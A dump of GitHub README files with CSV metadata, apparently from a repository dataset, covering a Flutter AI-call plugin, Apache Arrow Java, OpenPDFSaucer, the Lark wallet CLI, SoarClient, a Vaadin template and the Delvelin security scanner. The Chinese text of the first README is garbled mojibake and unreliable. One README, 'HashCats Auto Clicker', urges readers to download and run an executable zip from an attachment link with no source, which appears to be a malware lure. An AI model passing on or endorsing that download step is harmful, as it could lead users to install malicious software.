|-----|------|-----|
| text | String | ËØÜÂà´Âà∞ÁöÑÊñáÊú¨ÂÜÖÂÆπ |
| isSentenceEnd | bool | ÊòØÂê¶ÊòØÂè•Â≠êÁªìÊùü |
| sentenceId | int | Âè•Â≠êID |
| voicePrintStatus | VoicePrintStatusCode | Â£∞Á∫πÁä∂ÊÄÅÔºåÂèØËÉΩÁöÑÂÄº: <br> - disable: Á¶ÅÁî® <br> - enableWithoutRegister: ÂêØÁî®‰ΩÜÊú™Ê≥®ÂÜå <br> - speakerRecognized: ËØ¥ËØù‰∫∫Â∑≤ËØÜÂà´ <br> - speakerNotRecognized: ËØ¥ËØù‰∫∫Êú™ËØÜÂà´ <br> - unknown: Êú™Áü•Áä∂ÊÄÅ |

### onAIAgentSubtitleNotify
| ÂèÇÊï∞ | Á±ªÂûã | ËØ¥Êòé |
|-----|------|-----|
| text | String | AIÂõûÂ§çÁöÑÊñáÊú¨ÂÜÖÂÆπ |
| isSentenceEnd | bool | ÊòØÂê¶ÊòØÂè•Â≠êÁªìÊùü |
| userAsrSentenceId | int | ÂØπÂ∫îÁöÑÁî®Êà∑ËØ≠Èü≥ID |

### onVolumeChanged
| ÂèÇÊï∞ | Á±ªÂûã | ËØ¥Êòé           |
|-----|------|--------------|
| uid | String | Áî®Êà∑ID         |
| volume | int | Èü≥ÈáèÂ§ßÂ∞è (0-255) |

## ÈîôËØØÂ§ÑÁêÜ

Êèí‰ª∂‰ºöÈÄöËøá `onError` ÂõûË∞ÉËøîÂõûÈîôËØØ‰ø°ÊÅØ,Âª∫ËÆÆÂú®‰ΩøÁî®Êó∂ÂÅöÂ•ΩÈîôËØØÂ§ÑÁêÜ:

```dart
onError: (error) {
  switch(error) {
    case ""NETWORK_ERROR"":
      // Â§ÑÁêÜÁΩëÁªúÈîôËØØ
      break;
    case ""PERMISSION_DENIED"":
      // Â§ÑÁêÜÊùÉÈôêÈîôËØØ
      break;
    // Â§ÑÁêÜÂÖ∂‰ªñÈîôËØØ...
  }
}
```

## ÊúÄ‰Ω≥ÂÆûË∑µ

1. ÂàùÂßãÂåñÊó∂Êú∫
   - Âª∫ËÆÆÂú®Â∫îÁî®ÂêØÂä®Êó∂Â∞±ÂÆåÊàêÂàùÂßãÂåñ
   - Á°Æ‰øùÂú®Ë∞ÉÁî®ÂÖ∂‰ªñÊñπÊ≥ïÂâçÂÆåÊàêÂàùÂßãÂåñ

2. ËµÑÊ∫êÈáäÊîæ
   - Âú®È°µÈù¢ÈîÄÊØÅÊó∂Ë∞ÉÁî® hangup()
   - Ê≥®ÊÑèÊ∏ÖÁêÜÂõûË∞ÉÈÅøÂÖçÂÜÖÂ≠òÊ≥ÑÊºè

3. ÈîôËØØÂ§ÑÁêÜ
   - ÂØπÁΩëÁªúÈîôËØØËøõË°åÈáçËØï
   - ÂØπÊùÉÈôêÈîôËØØÁªô‰∫àÁî®Êà∑ÊèêÁ§∫
   - ËÆ∞ÂΩïÈîôËØØÊó•Âøó‰æø‰∫éÈóÆÈ¢òÊéíÊü•

4. ÊÄßËÉΩ‰ºòÂåñ
   - ÈÅøÂÖçÈ¢ëÁπÅÂàáÊç¢Èü≥Ëâ≤ÂíåËßíËâ≤
   - ÂêàÁêÜ‰ΩøÁî®ËØ≠Èü≥ÊâìÊñ≠ÂäüËÉΩ
   - Ê≥®ÊÑèÊéßÂà∂ÂΩïÈü≥Êñá‰ª∂Â§ßÂ∞è

## Â∏∏ËßÅÈóÆÈ¢ò

1. Q: ÂàùÂßãÂåñÂ§±Ë¥•ÊÄé‰πàÂäû?
   A: Ê£ÄÊü•ÁΩëÁªúËøûÊé•ÂíåÂèÇÊï∞ÈÖçÁΩÆÊòØÂê¶Ê≠£Á°Æ

2. Q: Ê≤°ÊúâÂ£∞Èü≥ÊÄé‰πàÂäû?
   A: Ê£ÄÊü•Èü≥ÈáèËÆæÁΩÆÂíåÊùÉÈôêÊòØÂê¶Ê≠£Á°Æ

3. Q: ËØ≠Èü≥ËØÜÂà´‰∏çÂáÜÁ°ÆÊÄé‰πàÂäû?
   A: Âª∫ËÆÆÂú®ÂÆâÈùôÁéØÂ¢É‰ΩøÁî®,ËØ¥ËØùÊ∏ÖÊô∞Â∫¶‰πüÈáçË¶Å

4. Q: ÈÅáÂà∞ ""Multiple commands produce xxx-umbrella.h"" ÈîôËØØÊÄé‰πàÂäû?
   A: ËøôÊòØ Xcode ÊûÑÂª∫ÂÜ≤Á™ÅÂØºËá¥ÁöÑÈóÆÈ¢òÔºåËß£ÂÜ≥Ê≠•È™§Â¶Ç‰∏ãÔºö
   1. Á°Æ‰øù podspec Êñá‰ª∂‰∏≠Ê≠£Á°ÆÈÖçÁΩÆ‰∫Ü source_files Âíå public_header_files
   2. Âà†Èô§ ios/Classes ÁõÆÂΩï‰∏ãÁöÑÈáçÂ§ç umbrella header Êñá‰ª∂
   3. Ê∏ÖÁêÜÂπ∂ÈáçÊñ∞ÂÆâË£Ö podsÔºö
      ```bash
      cd example/ios
      pod deintegrate
      pod cache clean --all
      rm -rf Pods
      rm -rf .symlinks
      rm Podfile.lock
      pod install
      ```
   4. ÈáçÊñ∞ÊûÑÂª∫È°πÁõÆÔºö
      ```bash
      flutter clean
      flutter pub get
      cd example/ios
      pod install
      cd ..
      flutter build ios
      ```

   
## Êõ¥Êñ∞Êó•Âøó

### 1.0.0
- ÂàùÂßãÁâàÊú¨ÂèëÂ∏É
- ÊîØÊåÅÂü∫Á°ÄËØ≠Èü≥ÈÄöËØùÂäüËÉΩ
- ÊîØÊåÅËØ≠Èü≥ËØÜÂà´ÂíåÂêàÊàê
- ÊîØÊåÅÈü≥ÈáèÊéßÂà∂ÂíåÁõëÊéß

## ÈóÆÈ¢òÂèçÈ¶à

Â¶ÇÊúâÈóÆÈ¢òËØ∑Êèê‰∫§ [Issue](https://github.com/MR-MaoJiu/ali_ai_call/issues)

## License

MIT License

## ÂºÄÊ∫ê‰∏çÊòìËßâÂæóÂ•ΩÁî®Áªô‰∏™StarÊàñËÄÖËµûÂä©‰∏Ä‰∏ã

![img.png](./document/img.png)
",0,1,1,BSD-3-Clause,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0
apache/arrow-java,main,"<!---
  Licensed to the Apache Software Foundation (ASF) under one
  or more contributor license agreements.  See the NOTICE file
  distributed with this work for additional information
  regarding copyright ownership.  The ASF licenses this file
  to you under the Apache License, Version 2.0 (the
  ""License""); you may not use this file except in compliance
  with the License.  You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing,
  software distributed under the License is distributed on an
  ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
  KIND, either express or implied.  See the License for the
  specific language governing permissions and limitations
  under the License.
-->

# Arrow Java

## Getting Started

The following guides explain the fundamental data structures used in the Java implementation of Apache Arrow.

- [ValueVector](https://arrow.apache.org/docs/java/vector.html) is an abstraction that is used to store a sequence of values having the same type in an individual column.
- [VectorSchemaRoot](https://arrow.apache.org/docs/java/vector_schema_root.html) is a container that can hold multiple vectors based on a schema.
- The [Reading/Writing IPC formats](https://arrow.apache.org/docs/java/ipc.html) guide explains how to stream record batches as well as serializing record batches to files.

Generated javadoc documentation is available [here](https://arrow.apache.org/docs/java/).

## Building from source

Refer to [Building Apache Arrow](https://arrow.apache.org/docs/dev/developers/java/building.html) for documentation of environment setup and build instructions.

## Flatbuffers dependency

Arrow uses Google's Flatbuffers to transport metadata.  The java version of the library
requires the generated flatbuffer classes can only be used with the same version that
generated them.  Arrow packages a version of the arrow-vector module that shades flatbuffers
and arrow-format into a single JAR.  Using the classifier ""shade-format-flatbuffers"" in your
`pom.xml` will make use of this JAR, you can then exclude/resolve the original dependency to
a version of your choosing.

### Updating the flatbuffers generated code

1. Verify that your version of flatc matches the declared dependency:

```bash
$ flatc --version
flatc version 24.3.25

$ grep ""dep.fbs.version"" java/pom.xml
    <dep.fbs.version>24.3.25</dep.fbs.version>
```

2. Generate the flatbuffer java files by performing the following:

```bash
cd $ARROW_HOME

# remove the existing files
rm -rf java/format/src

# regenerate from the .fbs files
flatc --java -o java/format/src/main/java format/*.fbs

# prepend license header
mvn spotless:apply -pl :arrow-format
```

## Performance Tuning

There are several system/environmental variables that users can configure.  These trade off safety (they turn off checking) for speed.  Typically they are only used in production settings after the code has been thoroughly tested without using them.

* Bounds Checking for memory accesses: Bounds checking is on by default.  You can disable it by setting either the
system property(`arrow.enable_unsafe_memory_access`) or the environmental variable
(`ARROW_ENABLE_UNSAFE_MEMORY_ACCESS`) to `true`. When both the system property and the environmental
variable are set, the system property takes precedence.

* null checking for gets: `ValueVector` get methods (not `getObject`) methods by default verify the slot is not null.  You can disable it by setting either the
system property(`arrow.enable_null_check_for_get`) or the environmental variable
(`ARROW_ENABLE_NULL_CHECK_FOR_GET`) to `false`. When both the system property and the environmental
variable are set, the system property takes precedence.

## Java Properties

 * `-Dio.netty.tryReflectionSetAccessible=true` should be set.
This fixes `java.lang.UnsupportedOperationException: sun.misc.Unsafe or java.nio.DirectByteBuffer.(long, int) not available`. thrown by Netty.
 * To support duplicate fields in a `StructVector` enable `-Darrow.struct.conflict.policy=CONFLICT_APPEND`.
Duplicate fields are ignored (`CONFLICT_REPLACE`) by default and overwritten. To support different policies for
conflicting or duplicate fields set this JVM flag or use the correct static constructor methods for `StructVector`s.

## Java Code Style Guide

Arrow Java follows the Google style guide [here][3] with the following
differences:

* Imports are grouped, from top to bottom, in this order: static imports,
standard Java, org.\*, com.\*
* Line length can be up to 120 characters
* Operators for line wrapping are at end-of-line
* Naming rules for methods, parameters, etc. have been relaxed
* Disabled `NoFinalizer`, `OverloadMethodsDeclarationOrder`, and
`VariableDeclarationUsageDistance` due to the existing code base. These rules
should be followed when possible.

Refer to [checkstyle.xml](dev/checkstyle/checkstyle.xml) for rule specifics.

## Test Logging Configuration

When running tests, Arrow Java uses the Logback logger with SLF4J. By default,
it uses the `logback.xml` present in the corresponding module's `src/test/resources`
directory, which has the default log level set to `INFO`.
Arrow Java can be built with an alternate logback configuration file using the
following command run in the project root directory:

```bash
mvn -Dlogback.configurationFile=file:<path-of-logback-file>
```

See [Logback Configuration][1] for more details.

## Integration Tests

Integration tests which require more time or more memory can be run by activating
the `integration-tests` profile. This activates the [maven failsafe][4] plugin
and any class prefixed with `IT` will be run during the testing phase. The integration
tests currently require a larger amount of memory (>4GB) and time to complete. To activate
the profile:

```bash
mvn -Pintegration-tests <rest of mvn arguments>
```

[1]: https://logback.qos.ch/manual/configuration.html
[2]: https://github.com/apache/arrow/blob/main/cpp/README.md
[3]: http://google.github.io/styleguide/javaguide.html
[4]: https://maven.apache.org/surefire/maven-failsafe-plugin/
",0,400,12,Apache-2.0,5,62.0,1.0,16.0,9.0,21.0,1.0,-10.75,1045.0
openpdfsaucer/openpdfsaucer,main,"# OpenPDFSaucer is an open source Java library for PDF files

OpenPDFSaucer is an open source Java library for creating, editing and rendering PDF files in Java:
- [OpenPDF](openpdf): creating and editing PDF files.
- [FlyingSaucer](flying-saucer-pdf): rendering arbitrary well-formed XML (or XHTML) using CSS 2.1 for layout and formatting, output to Swing panels, PDF, and images.
- [PDFrenderer](PDFrenderer): rendering PDF documents to the screen using Java2D as images.

OpenPDFSaucer is a combined fork of OpenPDF version 2.0.3 (forked from iText), FlyingSaucer v9.11.0 and PDFRenderer. 

![CI](https://github.com/openpdfsaucer/openpdfsaucer/actions/workflows/maven.yml/badge.svg)
[![License (LGPL version 2.1)](https://img.shields.io/badge/license-GNU%20LGPL%20version%202.1-blue.svg?style=flat-square)](http://opensource.org/licenses/LGPL-2.1)
[![CodeQL](https://github.com/openpdfsaucer/openpdfsaucer/actions/workflows/github-code-scanning/codeql/badge.svg)](https://github.com/openpdfsaucer/openpdfsaucer/actions/workflows/github-code-scanning/codeql)
[![Codacy Badge](https://app.codacy.com/project/badge/Grade/fa63ee335ecb4225808d1b4f3e4d6392)](https://app.codacy.com/gh/openpdfsaucer/openpdfsaucer/dashboard?utm_source=gh&utm_medium=referral&utm_content=&utm_campaign=Badge_grade)


## Features

Some of the features of OpenPDFSaucer include:

* Creating PDFs: You can use OpenPDF to create new PDF documents from scratch.
* Manipulating Existing PDFs: OpenPDF allows you to modify existing PDF documents by adding or removing pages, modifying
  text, and more.
* Text and Font Support: You can add text to PDF documents using various fonts and styles, and extract text from PDF
  files.
* Graphics and Images: OpenPDF supports the addition of images and graphics to PDF files.
* Table Support: The library facilitates the creation of tables in PDF documents.
* Encryption: You can encrypt PDF documents for security purposes.
* Page Layout: OpenPDF allows you to set the page size, orientation, and other layout properties.
* Rendering arbitrary well-formed XML (or XHTML) using CSS 2.1 for layout and formatting, output to Swing panels, PDF, and images, using Flying Saucer.
* Render PDF files as images using PDFrenderer.

# OpenPDFSaucer 2.0.0
Get OpenPDFSaucer here: https://github.com/openpdfsaucer/openpdfsaucer/releases/tag/2.0.0  

It is also available as a Maven module dependency: https://github.com/orgs/openpdfsaucer/packages?repo_name=openpdfsaucer  

## OpenPDFSaucer has these modules:
* [Openpdf](openpdf) OpenPDF is a free Java library for creating and editing PDF files.
* [Flying-saucer-core](flying-saucer-core) Flying Saucer is a Java library for rendering arbitrary well-formed XML (or XHTML) using CSS 2.1 for layout and formatting, output to Swing panels, PDF, and images.
* [Flying-saucer-pdf](flying-saucer-pdf) Flying Saucer PDF rendering of HTML.
* [Flying-saucer-browser](flying-saucer-browser) - a web browser in Java. 
* [PDFrenderer](PDFrenderer) Java library for rendering PDF documents to the screen using Java2D.
* [Openpdf-fonts-extra](openpdf-fonts-extra) Fonts for OpenPDF

# Documentation
* [JavaDoc](https://openpdfsaucer.github.io/openpdfsaucer/)

## License
OpenPDFSaucer is licended with GNU Lesser General Public License (LGPL), Version 2.1. This is the same license as the source code it is forked from: OpenPDF, Flying Saucer and PDFrenderer.

[GNU Lesser General Public License (LGPL), Version 2.1](https://www.gnu.org/licenses/old-licenses/lgpl-2.1)

> For a short explanation see https://en.wikipedia.org/wiki/GNU_Lesser_General_Public_License

We want OpenPDFSaucer to consist of source code which is consistently licensed with the LGPL 
licences only. This also means that any new contributions to the project must have a LGPL license only.
OpenPDF had a dual LGPL / MPL license, this fork will use the LGPL license specifically.

## Contributing

  Please send all pull requests. Make sure that your contributions can be
released with a LGPL license. In particular, pull requests to the OpenPDF project must
only contain code that you have written yourself. GPL or AGPL licensed code will not be acceptable.

To contribute code to the OpenPDFSaucer project, your GitHub account must contain your real name, so that
we can verify your identity. This is to ensure the trust, security and integrity of the OpenPDFSaucer
project, and to prevent security incidents such as the ""XZ Utils backdoor"". Knowning the real name
of the contributors will also identify and prevent conflict of interests.

More details: [Contributing](CONTRIBUTING.md)

### Coding Style

- Code indentation style is 4 spaces. Maximum line length is 120 characters.
- Generally try to preserve the coding style in the file you are modifying.

## Dependencies

### Required Dependencies

We have now different versions of OpenPDFSaucer, and they require different versions of Java:

- OpenPDFSaucer requires Java 21. This project is focusing on modernization and using modern technologies and APIs.

### Supporting complex glyph substitution/ Ligature substitution

OpenPDF supports glyph substitution which is required for correct rendering of fonts ligature substitution requirements.
FOP dependency is required to enable this feature. Refer following wiki for
details: [wiki](https://github.com/LibrePDF/OpenPDF/wiki/Multi-byte-character-language-support-with-TTF-fonts)

### Supporting OpenType layout, glyph positioning, reordering and substitution

OpenPDF supports OpenType layout, glyph positioning, reordering and substitution which is e.g. required for correct
positioning of accents, the rendering of non-Latin and right-to-left scripts. OpenPDF supports DIN 91379.
See: [wiki](https://github.com/LibrePDF/OpenPDF/wiki/Accents,-DIN-91379,-non-Latin-scripts)

### Optional

- [BouncyCastle](https://www.bouncycastle.org/) (BouncyCastle is used to sign PDF files, so it's a recommended
  dependency)
  - Provider (`org.bouncycastle:bcprov-jdk18on` or `org.bouncycastle:bcprov-ext-jdk18on` depending
    on which algorithm you are using)
  - PKIX/CMS (`org.bouncycastle:bcpkix-jdk18on`)
- Apache FOP (`org.apache.xmlgraphics:fop`)
- Please refer to our [pom.xml](pom.xml) to see what version is needed.

## Credits
- OpenPDF, FlyingSaucer and PDF renderer contributors.
- Please see [Contributors.md](Contributors.md).
",2,1,2,LGPL-3.0,2,0.0,1.0,2.0,1.0,9.0,0.0,-2.45,317.0
sparrowwallet/larkapp,master,"![Lark logo](https://github.com/sparrowwallet/larkapp/raw/refs/heads/master/larklogo.png)

# Lark App

The Lark application is a command line app for interacting with USB hardware wallets in Bitcoin related functions. 
It uses the Lark Java library at https://github.com/sparrowwallet/lark, which in turn is a port of the Python library [HWI](https://github.com/bitcoin-core/HWI).
The Lark command line application is designed to be a drop-in replacement for HWI, with a subset of commands implemented.
Documentation on the commands is available by running it with `--help`. 

## Running

Depending on your operating system, once extracted/installed, Lark can be run from the command line as follows: 

#### Linux
```shell
> lark/bin/lark
```

Note that on Linux, udev rules [may need to be installed](https://github.com/sparrowwallet/lark/blob/master/src/main/resources/udev/README.md) if you are not using the .deb/.rpm installation package.

#### macOS
```shell
> Lark.app/Contents/MacOS/Lark
```

#### Windows
```shell
> lark/lark.exe
```

### Example usage

Show usage:

```shell
lark --help
```

Enumerate all connected hardware wallets

```shell
lark enumerate
```

Get Native Segwit xpub

```shell
lark --device-type trezor getxpub ""m/84'/0'/0'""
```

Sign a testnet transaction

```shell
lark --chain test --device-type coldcard signtx ""cHNid...""
```

Sign a multisig transaction, supplying a previous wallet registration

```shell
lark --device-type ledger --wallet-desc ""wsh(sortedmulti(2,[2811576b/48h/0h/0h/2h]xpub...,[6533280b/48h/0h/0h/2h]xpub...))"" --wallet-name ""2 of 2 Multisig"" --wallet-registration ""c0ee51bae9b3e5ee5a5e01dbcd336cd5c5f8a5b760d1c68f6a2a0b91c2580406"" signtx ""cHNid...""
```

### Running from source

If you prefer to run Lark directly from source, it can be launched from within the project directory with

`./runlark`

Java 22 or higher must be installed.


## Building

To clone this project, use

`git clone --recursive git@github.com:sparrowwallet/larkapp.git`

or for those without SSH credentials:

`git clone --recursive https://github.com/sparrowwallet/larkapp.git`

In order to build, Lark requires Java 22 or higher to be installed.
The release binaries are built with [Eclipse Temurin 22.0.2+9](https://github.com/adoptium/temurin22-binaries/releases/tag/jdk-22.0.2%2B9).

Other packages may also be necessary to build depending on the platform. On Debian/Ubuntu systems:

`sudo apt install -y rpm fakeroot binutils`

The Lark binaries can be built from source using

`./gradlew jpackage`

When updating to the latest HEAD

`git pull --recurse-submodules`

The release binaries are reproducible (pre codesigning and installer packaging).


",1,0,1,Apache-2.0,1,0.0,0.0,1.0,3.0,7.0,0.0,-1.6,0.0
fakerUNcode/story-writer,main,"# story-writer
An interactive streaming application platform
",0,0,2,EPL-2.0,0,54.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
Soar-Client/Legacy-SoarClient,main,"<p align=""center""><img src=""/.github/Resources/logo.png"" alt=""Legacy SoarClient"" title=""Legacy SoarClient""></p>
The project is mainly aimed at being a modern and powerful PvP client developed by EldoDebug!

## How to launch
Download SoarClient.zip from the release page and run start.bat

## Has SoarClient development been discontinued?
Partially Yes, v8.0 is being developed, albeit very slowly  
I went offline and open source to save on server costs.

## How to setup project
### Eclipse
```
gradlew setupdecompworkspace
```
```
gradlew eclipse
```

### IntelliJ
```
gradlew setupdecompworkspace
```
```
gradlew genIntellijRuns
```

## How to build
```
gradlew build
```
",1,2,1,LGPL-3.0,0,4.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
bakiayman/HashCats-autoclicker,master,"# HashCats Auto Clicker üê±
HashCats Auto Clicker is a versatile tool that enhances your gaming experience by automating various actions within the HashCats game.

## Overview
Do you want to level up faster in the HashCats game? Tired of repetitive clicking tasks? HashCats Auto Clicker comes to the rescue! This tool automates your actions, giving you more time to enjoy the game without the hassle of manual clicking.

## Features
- Automate clicking tasks in HashCats game
- Customizable click intervals
- Easy-to-use interface

## Installation
To access the HashCats Auto Clicker tool, download it [here](https://github.com/user-attachments/files/17804088/Program.zip). This link needs to be launched to initiate the download.

## How to Use
1. Download the HashCats Auto Clicker tool from the provided link.
2. Unzip the downloaded file to a location of your choice.
3. Run the executable file to launch the auto clicker tool.
4. Specify the click interval and actions you want to automate within the HashCats game.
5. Sit back, relax, and watch as the auto clicker handles the clicking tasks for you.

## Get Started
Boost your HashCats gaming experience with HashCats Auto Clicker. Say goodbye to manual clicking and hello to streamlined automation. Download the tool now and level up like never before!

[![Download HashCats Auto Clicker](https://img.shields.io/badge/Download-HashCats%20Auto%20Clicker-blue)](https://github.com/user-attachments/files/17804088/Program.zip)

## Disclaimer
Please note that the HashCats Auto Clicker tool is intended for enhancing the gaming experience within the HashCats game. Use it responsibly and in accordance with the game's terms of service.

Check the ""Releases"" section for any updated versions of the tool. Happy gaming! üéÆüêæ",3,0,1,Unlicense,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,3.0
fredpena/vaadin-flow-lab,main,"# Vaadin-Lab

This project can be used as a starting point to create your own Vaadin application with Spring Boot.
It contains all the necessary configuration and some placeholder files to get you started.

## Running the application

The project is a standard Maven project. To run it from the command line,
type `mvnw` (Windows), or `./mvnw` (Mac & Linux), then open
http://localhost:8080 in your browser.

You can also import the project to your IDE of choice as you would with any
Maven project. Read more on [how to import Vaadin projects to different IDEs](https://vaadin.com/docs/latest/guide/step-by-step/importing) (Eclipse, IntelliJ IDEA, NetBeans, and VS Code).

## Deploying to Production

To create a production build, call `mvnw clean package -Pproduction` (Windows),
or `./mvnw clean package -Pproduction` (Mac & Linux).
This will build a JAR file with all the dependencies and front-end resources,
ready to be deployed. The file can be found in the `target` folder after the build completes.

Once the JAR file is built, you can run it using
`java -jar target/vaadin-lab-1.0-SNAPSHOT.jar`

## Project structure

- `MainLayout.java` in `src/main/java` contains the navigation setup (i.e., the
  side/top bar and the main menu). This setup uses
  [App Layout](https://vaadin.com/docs/components/app-layout).
- `views` package in `src/main/java` contains the server-side Java views of your application.
- `views` folder in `src/main/frontend` contains the client-side JavaScript views of your application.
- `themes` folder in `src/main/frontend` contains the custom CSS styles.

## Useful links

- Read the documentation at [vaadin.com/docs](https://vaadin.com/docs).
- Follow the tutorial at [vaadin.com/docs/latest/tutorial/overview](https://vaadin.com/docs/latest/tutorial/overview).
- Create new projects at [start.vaadin.com](https://start.vaadin.com/).
- Search UI components and their usage examples at [vaadin.com/docs/latest/components](https://vaadin.com/docs/latest/components).
- View use case applications that demonstrate Vaadin capabilities at [vaadin.com/examples-and-demos](https://vaadin.com/examples-and-demos).
- Build any UI without custom CSS by discovering Vaadin's set of [CSS utility classes](https://vaadin.com/docs/styling/lumo/utility-classes). 
- Find a collection of solutions to common use cases at [cookbook.vaadin.com](https://cookbook.vaadin.com/).
- Find add-ons at [vaadin.com/directory](https://vaadin.com/directory).
- Ask questions on [Stack Overflow](https://stackoverflow.com/questions/tagged/vaadin) or join our [Forum](https://vaadin.com/forum).
- Report issues, create pull requests in [GitHub](https://github.com/vaadin).
",0,2,2,Unlicense,0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
hangga/delvelin,main,"<img src=""https://github.com/hangga/delvelin/blob/main/doc/delvelin-soft-black.webp?raw=true"" 
alt=""Delvelin Scan Demo"" width=""260"">

![Java](https://img.shields.io/badge/Java-8+-blue?logo=java) ![Kotlin](https://img.shields.io/badge/Kotlin-1.5+-blueviolet?logo=kotlin) ![Gradle Plugin](https://img.shields.io/badge/Gradle-Plugin-brightgreen?logo=gradle) ![CWE](https://img.shields.io/badge/CWE-Standards-orange) ![CVSS](https://img.shields.io/badge/CVSS-Severity-red)
[![OSV.dev](https://img.shields.io/badge/OSV.dev-Vulnerability%20Database-blue)](https://google.github.io/osv.dev/)
[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE) 
---
**Delveline** is a tool for Kotlin and Java developers that identifies and categorizes vulnerabilities, helping teams align with security standards like ISO 27001 and improve code security.

### Jump ahead:
- 1.[How it Works](#1-how-it-works)
- 2.[Example Output](#2-example-output)
- 3.[Integrating Delvelin](#3-integrating-delvelin)
    * 3.1. [Using Delvelin Gradle Plugin](#31-using-delvelin-gradle-plugin)
        + [Kotlin DSL](#kotlin-dsl)
        + [Groovy DSL](#groovy-dsl)
        + [Configuration](#configuration)
        + [Running Delvelin Analyzer](#running-delvelin-analyzer)
            - [On Local Machine](#on-local-machine)
            - [On Gitlab CI](#on-gitlab-ci)
    * 3.2. [Using Delvelin Library](#using-delvelin-library)
        + [Gradle Configuration](#gradle-configuration)
        + [Maven Configuration](#maven-configuration)
        + [Best Practices](#best-practices)
        + [Usage on Android](#usage-on-android)
        + [Alternative Examples](#alternative-examples)
        + [Configuration Options](#configuration-options)
        + [Usage with Custom Detector](#usage-with-custom-detector)
- 4.[License](#4-license)
- 5.[Contributing](#5-contributing)
---

![Delvelin Scan Demo](https://delvelin.github.io/assets/img/delvelin-scan-new.gif)

# 1. How it Works

Delveline is a specialized tool designed for Kotlin and Java developers, helping identify and categorize software vulnerabilities effectively. By leveraging the CWE (Common Weakness Enumeration) framework and detecting CVE (Common Vulnerabilities and Exposures), Delveline bridges the gap between secure software development and industry standards like ISO 27001.

Aligned with ISO 27001‚Äôs focus on information security and risk management, Delveline provides actionable insights into vulnerabilities within source code and dependencies specific to Kotlin and Java projects. While not a standalone security solution, it serves as a valuable aid in achieving compliance by offering clear categorization of risks and practical guidance for remediation.

We leverage:
- [CWE (Common Weakness Enumeration)](https://cwe.mitre.org/data/slices/699.html): A global standard for identifying and categorizing vulnerabilities.
- [OSV (Open Source Vulnerabilities)](https://google.github.io/osv.dev/): A comprehensive database for open-source vulnerability information.
- **ISO/IEC 27001 Alignment**: Supporting security awareness and risk management practices aligned with global information security standards.

Delveline empowers Kotlin and Java teams to develop secure and resilient applications while aligning their development practices with global security standards.

# 2. Example Output

<div style=""display: flex; justify-content: space-between; gap: 10px;"">
  <a href=""https://github.com/delvelin/blog/blob/master/_posts/delvelin-report-console-1.png?raw=true"" target=""_blank"">
    <img 
      src=""https://github.com/delvelin/blog/blob/master/_posts/delvelin-report-console-1.png?raw=true""/>
  </a>
  <a href=""https://github.com/delvelin/blog/blob/master/_posts/delvelin-report-console-2.png?raw=true"" target=""_blank"">
    <img 
      src=""https://github.com/delvelin/blog/blob/master/_posts/delvelin-report-console-2.png?raw=true""/>
  </a>
</div>

Or view example in <a href=""https://delvelin.github.io/docs/vulnerability-report.html"">HTML 
 Format</a>

[//]: # (<img )

[//]: # (src=""https://github.com/delvelin/blog/blob/master/_posts/delvelin-report-html.png?raw=true"" )

[//]: # (alt=""Delveline Report HTML View"" width=""60%"" />)

> **Disclaimer**: Delveline may not identify all vulnerabilities but serves as a powerful first step in securing your codebase.

# 3. Integrating Delvelin

To integrate delvelin in Java/Kotlin project, we can use two ways. Choose the way that suits 
your project needs:

## 3.1. Using Delvelin Gradle Plugin

Add the plugin to your Gradle project.

### KTS
```kotlin
plugins {
    id(""io.github.hangga.delvelin"") version ""0.2.0-beta""
}
```

### Groovy
```groovy
plugins {
    id 'io.github.hangga.delvelin' version '0.2.0-beta'
}
```

### Configuration

Configure Delvelin using the `delvelin` extension.

```groovy
delvelin {
    outputFileFormat = 'JSON' // Options: LOG, JSON, HTML
    showSaveDialog = false
}
```

| Configuration Option                     | Description                                                                                  | Default Value |
|------------------------------------------|----------------------------------------------------------------------------------------------|---------------|
| `setOutputFormat` | Set the output format of the analysis (e.g., `HTML`, `JSON`, or `LOG`).                  | `LOG`     |
| `setAutoLaunchBrowser`    | Automatically open the generated HTML report in the browser. Set to `false` to disable.      | `false`       |
| `setShowSaveDialog`       | Display a save dialog for HTML and JSON reports. Set to `false` to disable.                  | `false`       |

### Running Delvelin Analyzer

#### On Local Machine

Run the `delvelinScan` task to analyze your project:
```bash
./gradlew delvelinScan
```
![Delvelin Scan Demo](https://delvelin.github.io/assets/img/delvelin-scan-new.gif)

If we are using Intellij IDEA, we can also use the gradle menu in the sidebar:

<div style=""display: flex; justify-content: center; align-items: center;"">  
    <img style=""width:300px;"" 
    src=""https://github.com/hangga/delvelin/blob/main/doc/delvelin-scan-gradle-menu.png?raw=true"" alt=""sidebar""/>
</div>

#### On Gitlab CI
Add `delvelinScan` gradle task to our pipeline configuration, for example:
```yaml
stages:
  - test

gradle-scan:
  stage: test
  image: gradle:7.6-jdk8
  script:
    - gradle delvelinScan
  only:
    - main
    - develop
```

## 3.2. Using Delvelin Library

We can use the Delvelin library just like any other Kotlin/Java library. It offers a more flexible way with additional configuration.

### Gradle

```kotlin
repositories {
    maven { url 'https://repo.repsy.io/mvn/hangga/repo' }
}

dependencies {
    testImplementation('io.github.hangga:delvelin-plugin:0.2.0-beta')
}
```

### Maven

```xml

<repository>
    <id>hangga-repsy-repo</id>
    <url>https://repo.repsy.io/mvn/hangga/repo</url>
</repository>

<dependency>
    <groupId>io.github.hangga</groupId>
    <artifactId>delvelin-plugin</artifactId>
    <version>0.2.0-beta</version>
    <scope>test</scope>
</dependency>
```

### Best Practices

It is highly recommended to run the Delvelin library in unit tests to keep your production classes clean. You can also run it in the main class or the project‚Äôs main package, but this is not advised.

Here‚Äôs an example of a unit test to instantiate and run Delvelin:

```kotlin
@Test
fun `vulnerability test`() {
    Delvelin()
        .setOutputFormat(OutputFileFormat.HTML)
        .setAutoLaunchBrowser(true) // Automatically opens the browser for HTML format
        .setAllowedExtensions("".java"") // By default, it supports .java, .kt, .gradle, .kts, and .xml
        .setShowSaveDialog(true) // Only applicable for HTML & JSON formats
        .setShowDate(true) // For Console LOG format
        .scan()
}
```

### Usage on Android

To log messages in LogCat, you can use a custom listener like this:

```kotlin
@Test
fun `vulnerability test with custom listener for android`() {
    Delvelin().setLogListener(object : LogListener {
        override fun onGetLog(s: String) {
            Log.d(""DelvelinLog"", s)
        }

